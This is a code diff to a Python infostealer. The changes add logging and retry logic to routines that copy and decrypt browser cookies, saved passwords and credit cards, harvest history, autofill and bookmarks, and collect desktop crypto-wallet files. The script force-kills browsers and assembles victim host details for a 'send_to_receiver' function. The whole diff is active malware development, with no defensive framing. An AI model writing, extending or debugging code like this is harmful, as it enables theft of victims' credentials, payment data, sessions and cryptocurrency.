@@ -75,7 +75,6 @@ HOSTNAME = platform.node()
 def get_machine_id() -> str:
     """Generate a stable unique machine identifier."""
     try:
-        # Use machine GUID + username for stability
         key = f"{HOSTNAME}-{USERNAME}-{LOCAL}"
         return hashlib.sha256(key.encode()).hexdigest()[:32]
     except Exception:
@@ -173,23 +172,30 @@ def temp_copy(src: str) -> str:
     try:
         shutil.copy2(src, dst)
         return dst
-    except Exception:
+    except Exception as e:
+        print(f"    [!] Copy failed for {src}: {e}")
         return None
 
 def query_db(path: str, sql: str):
     """Execute read-only query with retry."""
     if not path or not os.path.exists(path):
+        print(f"    [!] DB not found: {path}")
         return []
-    for _ in range(3):
+    for attempt in range(3):
         tmp = temp_copy(path)
         if not tmp:
+            time.sleep(0.5)
             continue
         conn = None
         try:
             conn = sqlite3.connect(tmp, timeout=5)
-            return conn.execute(sql).fetchall()
-        except Exception:
-            pass
+            result = conn.execute(sql).fetchall()
+            print(f"    [+] Query OK: {len(result)} rows")
+            return result
+        except sqlite3.OperationalError as e:
+            print(f"    [!] SQLite error (attempt {attempt+1}): {e}")
+        except Exception as e:
+            print(f"    [!] Query error (attempt {attempt+1}): {e}")
         finally:
             if conn:
                 try:
@@ -200,6 +206,7 @@ def query_db(path: str, sql: str):
                 os.remove(tmp)
             except:
                 pass
+        time.sleep(0.5)
     return []
 
 # ─── Profile Discovery ─────────────────────────────────────────────
@@ -218,8 +225,8 @@ def discover_profiles(base_path: str):
             elif os.path.exists(os.path.join(entry.path, "Cookies")) or \
                  os.path.exists(os.path.join(entry.path, "Network", "Cookies")):
                 profiles.append(name)
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"  [!] Profile discovery error: {e}")
     return profiles if profiles else ["Default"]
 
 def find_cookie_db(profile_path: str) -> str:
@@ -254,6 +261,7 @@ def find_bookmarks(profile_path: str) -> str:
 # ─── Data Extraction ───────────────────────────────────────────────
 def extract_cookies(cookie_db: str, master_key: bytes):
     """Extract and decrypt all cookies."""
+    print(f"    [*] Reading cookies from: {os.path.basename(cookie_db)}")
     rows = query_db(cookie_db, """
         SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite
         FROM cookies
@@ -288,6 +296,7 @@ def extract_cookies(cookie_db: str, master_key: bytes):
 
 def extract_passwords(login_db: str, master_key: bytes):
     """Extract saved passwords."""
+    print(f"    [*] Reading passwords from: {os.path.basename(login_db)}")
     rows = query_db(login_db, """
         SELECT origin_url, username_value, password_value
         FROM logins
@@ -304,6 +313,7 @@ def extract_passwords(login_db: str, master_key: bytes):
 
 def extract_credit_cards(web_data: str, master_key: bytes):
     """Extract credit cards."""
+    print(f"    [*] Reading cards from: {os.path.basename(web_data)}")
     rows = query_db(web_data, """
         SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, origin
         FROM credit_cards
@@ -373,7 +383,8 @@ def extract_bookmarks(bookmarks_path: str):
         bookmarks = []
         walk_bookmarks(data.get("roots", {}), bookmarks)
         return bookmarks
-    except Exception:
+    except Exception as e:
+        print(f"    [!] Bookmark extraction error: {e}")
         return []
 
 # ─── Desktop Wallets ───────────────────────────────────────────────
@@ -431,7 +442,6 @@ def extract_desktop_wallets():
                     fpath = os.path.join(wdir, fname)
                     if not os.path.isfile(fpath):
                         continue
-                    # Match patterns
                     matched = False
                     for pat in cfg["files"]:
                         if pat == "*" or fname == pat or (pat.startswith("*") and fname.endswith(pat[1:])):
@@ -469,7 +479,6 @@ def get_user_agent():
     except:
         pass
 
-    # Try to read from Chrome executable version
     chrome_paths = [
         os.path.join(os.getenv("PROGRAMFILES", ""), "Google", "Chrome", "Application", "chrome.exe"),
         os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
@@ -492,11 +501,13 @@ def kill_browsers():
     ]
     for proc in targets:
         try:
-            os.system(f"taskkill /F /IM {proc} >nul 2>&1")
+            result = os.system(f"taskkill /F /IM {proc} >nul 2>&1")
+            if result == 0:
+                print(f"  [+] Killed {proc}")
         except:
             pass
     import time
-    time.sleep(1.5)
+    time.sleep(2)
 
 # ─── Send to Receiver ──────────────────────────────────────────────
 def send_to_receiver(payload: dict):
@@ -584,6 +595,8 @@ def extract_all():
                     print(f"      [+] {len(profile_info['cookies'])} cookies")
                 except Exception as e:
                     print(f"      [!] Cookies failed: {e}")
+            else:
+                print(f"      [!] No cookie DB found")
 
             # Passwords
             login_db = find_login_db(profile_path)
@@ -593,6 +606,8 @@ def extract_all():
                     print(f"      [+] {len(profile_info['passwords'])} passwords")
                 except Exception as e:
                     print(f"      [!] Passwords failed: {e}")
+            else:
+                print(f"      [!] No login DB found")
 
             # Credit Cards
             web_data = find_web_data(profile_path)
@@ -608,6 +623,8 @@ def extract_all():
                     print(f"      [+] {len(profile_info['autofill'])} autofill entries")
                 except Exception as e:
                     print(f"      [!] Autofill failed: {e}")
+            else:
+                print(f"      [!] No Web Data DB found")
 
             # History
             hist_db = find_history_db(profile_path)
@@ -617,6 +634,8 @@ def extract_all():
                     print(f"      [+] {len(profile_info['history'])} history entries")
                 except Exception as e:
                     print(f"      [!] History failed: {e}")
+            else:
+                print(f"      [!] No History DB found")
 
             # Bookmarks
             bm_path = find_bookmarks(profile_path)
@@ -626,6 +645,8 @@ def extract_all():
                     print(f"      [+] {len(profile_info['bookmarks'])} bookmarks")
                 except Exception as e:
                     print(f"      [!] Bookmarks failed: {e}")
+            else:
+                print(f"      [!] No Bookmarks file found")
 
             profiles_data.append(profile_info)
 
@@ -641,7 +662,7 @@ def extract_all():
         "hostname": HOSTNAME,
         "username": USERNAME,
         "os_info": f"{platform.system()} {platform.release()}",
-        "ip": "",  # Receiver will see the IP
+        "ip": "",
         "user_agent": get_user_agent(),
         "profiles": profiles_data,
         "desktop_wallets": desktop_wallets,
